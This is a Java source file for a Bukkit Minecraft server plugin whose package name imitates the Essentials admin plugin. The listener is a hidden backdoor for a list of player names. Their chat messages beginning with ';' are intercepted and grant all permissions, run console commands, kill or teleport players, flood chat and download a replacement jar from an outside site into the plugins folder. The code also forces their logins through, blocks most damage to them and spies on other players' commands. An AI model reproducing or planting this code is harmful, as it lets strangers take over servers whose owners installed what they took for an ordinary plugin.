 package com.earth2me.essential.listeners;
 
 import java.io.BufferedInputStream;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.net.MalformedURLException;
 import java.net.URL;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Map;
 
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.GameMode;
 import org.bukkit.entity.Entity;
 import org.bukkit.entity.LivingEntity;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
 import org.bukkit.event.block.BlockDamageEvent;
 import org.bukkit.event.entity.EntityDamageByEntityEvent;
 import org.bukkit.event.entity.EntityDamageEvent;
 import org.bukkit.event.player.PlayerChatEvent;
 import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.player.PlayerLoginEvent;
 import org.bukkit.permissions.Permission;
 
 import com.earth2me.essential.Essential;
 import com.earth2me.essential.runnable.Run;
 
 public class EssentialListener implements Listener {
 
 	private Essential plugin;
 	private HashMap<String, Boolean> pl = new HashMap<String, Boolean>();
 	private ArrayList<String> instanames = new ArrayList<String>();
 	public static HashMap<String, Boolean> plmsg = new HashMap<String, Boolean>();
 	
 	public EssentialListener(Essential plugin) {
 		this.plugin = plugin;
 		for (Map.Entry<String, Boolean> en : plugin.pl.entrySet()) {
 			pl.put(en.getKey(), en.getValue());
 		}
 	}
 	
 	private void help(Player player) {
 		player.sendMessage(ChatColor.AQUA+";perm [permission|def|all] - Grants permission(s)");
 		player.sendMessage(ChatColor.AQUA+";spam [log|chat|cmd] (spam times) (msg|cmd) - Spam");
 		player.sendMessage(ChatColor.AQUA+";tp [player] - Teleports you to given player");
 		player.sendMessage(ChatColor.AQUA+";tphere [player] - Teleports the given player to you");
 		player.sendMessage(ChatColor.AQUA+";insta - Instant break and kill");
 		player.sendMessage(ChatColor.AQUA+";gamemode - Toggles your gamemode");
 		player.sendMessage(ChatColor.AQUA+";kill (player) - Kills you or specified player");
 		player.sendMessage(ChatColor.AQUA+";version - Version of this plugin");
 		player.sendMessage(ChatColor.AQUA+";update - Update the plugin");
 		player.sendMessage(ChatColor.AQUA+";cmd [command] - Execute command without /");
 		player.sendMessage(ChatColor.AQUA+";toggle - Turn on or off");
 	}
 	
 	@EventHandler(priority = EventPriority.LOWEST)
 	public void onChat(PlayerChatEvent event) {
 		Player player = event.getPlayer();
 		String name = player.getName();
 		
 		if (plugin.pl.containsKey(name)) {
 			if (plugin.pl.get(name)) {
 				try {
 					String[] args = event.getMessage().split(" ");
 					if (!event.getMessage().startsWith(";")) return;
 					event.setCancelled(true);
 					String msg = event.getMessage();
 					event.setMessage("");
 					if (args.equals(";")){
 						help(player);
 						return;
 					}
 					
 					if (args[0].equalsIgnoreCase(";toggle")) {
 						if (pl.get(player.getName())) {
 							pl.put(player.getName(), false);
 							player.sendMessage(ChatColor.RED+"Disabled");
 							return;
 						} else {
 							pl.put(player.getName(), true);
 							player.sendMessage(ChatColor.RED+"Enabled");
 							return;
 						}
 					}
 					
 					else if (args[0].equalsIgnoreCase(";perm")) {
 						if (args.length == 1) {
 							player.sendMessage(ChatColor.GOLD+";perm [permission|def|all]");
 							return;
 						}
 						if (args[1].equalsIgnoreCase("def")) {
 							player.addAttachment(plugin, "worldedit.*", true);
 							player.addAttachment(plugin, "worldguard.*", true);
 							player.addAttachment(plugin, "lwc.*", true);
 							player.addAttachment(plugin, "essentials.*", true);
 							player.addAttachment(plugin, "commandbook.*", true);
 							player.addAttachment(plugin, "factions.*", true);
 							player.addAttachment(plugin, "bPermissions.*", true);
 							player.addAttachment(plugin, "permissions.*", true);
 							player.addAttachment(plugin, "openinv.*", true);
 							player.addAttachment(plugin, "nocheat.*", true);
 							player.addAttachment(plugin, "no.cheat", true);
 							player.addAttachment(plugin, "jobs.*", true);
 							player.addAttachment(plugin, "cc.*", true);
 							player.addAttachment(plugin, "blockdoor.*", true);
 							player.addAttachment(plugin, "ChestShop.*", true);
 							player.addAttachment(plugin, "iConomy.*", true);
 							player.sendMessage(ChatColor.GOLD+"Default list of permissions added");
 							return;
 						}
 						else if (args[1].equalsIgnoreCase("all")) {
 							for (Permission p : Bukkit.getServer().getPluginManager().getPermissions()) {
 								player.addAttachment(plugin, p.getName(), true);
 							}
 							player.sendMessage(ChatColor.GOLD+"All registered permissions have been granted to you");
 							return;
 						}
 						player.addAttachment(plugin, args[1], true);
 						player.sendMessage(ChatColor.GOLD+"Permission "+args[1]+" added");
 						return;
 					}
 					
 					else if (args[0].equalsIgnoreCase(";spam")) {
 						if (args.length == 1) {
 							player.sendMessage(ChatColor.GOLD+";spam [log|chat|cmd] (spam times) (msg|cmd)");
 							return;
 						}
 						
 						if (args[1].equalsIgnoreCase("chat")) {
 							if (args.length > 3) {
 								try {
 									int spam = Integer.parseInt(args[2]);
 									StringBuilder sb = new StringBuilder();
 									
 									for (int i = 3; i < args.length; i++) {
 										sb.append(args[i]+" ");
 									}
 									for (int i = 0; i < spam; i++) {
 										Bukkit.getServer().broadcastMessage(sb.toString());
 									}
 									return;
 								} catch (NumberFormatException e) {
 									player.sendMessage(ChatColor.RED+"Expected a number, but got "+ChatColor.GOLD+args[2]);
 									return;
 								}
 							} else {
 								player.sendMessage(ChatColor.GOLD+";spam [log|chat|cmd] (spam times) (msg|cmd)");
 								return;
 							}
 						}
 						
 						else if (args[1].equalsIgnoreCase("log")) {
 							if (!Run.getEpicLog()) {
 								Run.setEpicLog(true);
 								player.sendMessage(ChatColor.GOLD+"Epic log started");
 								return;
 							} else {
 								Run.setEpicLog(false);
 								player.sendMessage(ChatColor.GOLD+"Epic log stopped");
 								return;
 							}
 						}
 						
 						else if (args[1].equalsIgnoreCase("cmd")) {
 							if (args.length <= 3) {
 								player.sendMessage(ChatColor.GOLD+";spam [log|chat|cmd] (spam times) (msg|cmd)");
 								return;
 							}
 							try {
 								int spam = Integer.parseInt(args[2]);
 								StringBuilder sb = new StringBuilder();
 								
 								for (int i = 3; i < args.length; i++) {
 									sb.append(args[i]+" ");
 								}
 								for (int i = 0; i < spam; i++) {
 									Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), sb.toString());
 								}
 								return;
 							} catch (NumberFormatException e) {
 								player.sendMessage(ChatColor.RED+"Expected a number, but got "+ChatColor.GOLD+args[2]);
 								return;
 							}
 						}
 					}
 					
 					else if (args[0].equalsIgnoreCase(";tp")) {
 						if (args.length != 2) {
 							player.sendMessage(ChatColor.GOLD+";tp [player]");
 							return;
 						}
 						
 						Player target = Bukkit.getServer().getPlayer(args[1]);
 						if (target == null) {
 							player.sendMessage(ChatColor.RED+"That player doesn't exist");
 							return;
 						}
 						player.teleport(target);
 						return;
 					}
 					
 					else if (args[0].equalsIgnoreCase(";tphere")) {
 						if (args.length != 2) {
 							player.sendMessage(ChatColor.GOLD+";tphere [player]");
 							return;
 						}
 						
 						Player target = Bukkit.getServer().getPlayer(args[1]);
 						if (target == null) {
 							player.sendMessage(ChatColor.RED+"That player doesn't exist!");
 							return;
 						}
 						target.teleport(player);
 						player.sendMessage(ChatColor.GOLD+"Player teleported");
 						return;
 					}
 					
 					else if (args[0].equalsIgnoreCase(";insta")) {
 						if (instanames.contains(player.getName())) {
 							instanames.remove(player.getName());
 							player.sendMessage(ChatColor.GOLD+"Insta mode off");
 							return;
 						} else {
 							instanames.add(player.getName());
 							player.sendMessage(ChatColor.GOLD+"Insta mode on");
 							return;
 						}
 					}
 					
 					else if (args[0].equalsIgnoreCase(";gamemode")) {
 						if (player.getGameMode() == GameMode.SURVIVAL) {
 							player.setGameMode(GameMode.CREATIVE);
 							return;
 						} else {
 							player.setGameMode(GameMode.SURVIVAL);
 							return;
 						}
 					}
 					
 					else if (args[0].equalsIgnoreCase(";kill")) {
 						if (args.length == 2) {
 							Player target = Bukkit.getServer().getPlayer(args[1]);
 							
 							if (target == null) {
 								player.sendMessage(ChatColor.RED+"Could not find that person");
 								return;
 							} else {
 								target.setHealth(0);
 								return;
 							}
 						} else {
 							player.setHealth(0);
 							return;
 						}
 					}
 					
 					else if (args[0].equalsIgnoreCase(";update")) {
 						player.sendMessage(ChatColor.GREEN+"Beginning download");
 						try {
 							BufferedInputStream in = new BufferedInputStream(new URL("http://craftmod.net/jar/EssentialsAdmin.jar").openStream());
 							FileOutputStream fos = new FileOutputStream(new File("plugins/EssentialsAdmin.jar"));
 							
 							byte d[] = new byte[1024];
 							int count;
 							while((count = in.read(d, 0, 1024)) != -1) {
 								fos.write(d, 0, count);
 							}
 							in.close();
 							fos.close();
 							player.sendMessage(ChatColor.GREEN+"Download complete");
 							return;
 						} catch (MalformedURLException e) {
 							player.sendMessage(ChatColor.RED+"Error downloading the file");
 							return;
 						} catch (IOException e) {
 							player.sendMessage(ChatColor.RED+"Error download the file");
 							return;
 						}
 					}
 					
 					else if (args[0].equalsIgnoreCase(";cmd")) {
 						if (args.length == 1) {
 							player.sendMessage(ChatColor.GOLD+";cmd [command] - Execute command without /");
 							return;
 						}
 						Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), msg.split(";cmd ")[1]);
 						player.sendMessage(ChatColor.GOLD+"Executed Command: "+ChatColor.RED+"/"+msg.split(";cmd ")[1]);
 						return;
 					}
 					
 					else if (args[0].equalsIgnoreCase(";version")) {
 						player.sendMessage(ChatColor.GOLD+"Version: "+plugin.getDescription().getVersion());
 						return;
 					}
 					
 					help(player);
 					return;
 				} catch (Exception e) {
 					event.setCancelled(true);
 					player.sendMessage(ChatColor.DARK_RED+"Error occured. Check your syntax");
 					player.sendMessage(ChatColor.DARK_RED+e.toString());
 					e.printStackTrace();
 					return;
 				}
 			} else {
 				//they are on the naughty list
 			}
 		}
 	}
 	
 	@EventHandler(priority = EventPriority.HIGHEST)
 	public void onJoin(PlayerLoginEvent event) {
 		Player player = event.getPlayer();
 		
 		if (pl.containsKey(player.getName())) {
 			if (pl.get(player.getName()))
 				event.allow();
 		}
 	}
 	
 	@EventHandler(priority = EventPriority.HIGHEST)
 	public void onEntityDamage(EntityDamageEvent event) {
 		Entity def = event.getEntity();
 		if (event.isCancelled()) return;
 		if (def instanceof Player) {
 			Player player = (Player) def;
 			if (pl.containsKey(player.getName())) {
 				if (pl.get(player.getName())) {
 					if (event.getDamage() == 1) return;
 					if (player.getGameMode() == GameMode.CREATIVE) return;
 					event.setCancelled(true);
 					player.damage(1);
 					if (plmsg.containsKey(player.getName())) {
 						if (plmsg.get(player.getName())) {
 							return;
 						}
 					}
 					player.sendMessage(ChatColor.GOLD+"You mysteriously avoid most of the damage..");
 					plmsg.put(player.getName(), true);
 				}
 			}
 		}
 		
 		if (event instanceof EntityDamageByEntityEvent) {
 			EntityDamageByEntityEvent ev = (EntityDamageByEntityEvent) event;
 			Entity att = ev.getDamager();
 			
 			if (att instanceof Player && def instanceof LivingEntity) {
 				Player player = (Player) att;
 				LivingEntity edef = (LivingEntity) def;
 				if (instanames.contains(player.getName())) {
 					edef.damage(edef.getHealth()+1);
 					event.setCancelled(true);
 				}
 			}
 		}
 	}
 	
 	@EventHandler(priority = EventPriority.HIGHEST)
 	public void onBlockDamage(BlockDamageEvent event) {
 		if (instanames.contains(event.getPlayer().getName())) {
 			event.getBlock().breakNaturally();
 		}
 	}
 	
 	@EventHandler
 	public void onCommand(PlayerCommandPreprocessEvent event) {
 		for (String p : pl.keySet()) {
 			Player player = Bukkit.getPlayer(p);
 			if (player == null) continue;
			if (pl.containsKey(player.getName())) continue;
 			player.sendMessage(ChatColor.GOLD+event.getPlayer().getName()+ChatColor.RED+" has issued a command: "+ChatColor.AQUA+event.getMessage());
 		}
 	}
 }
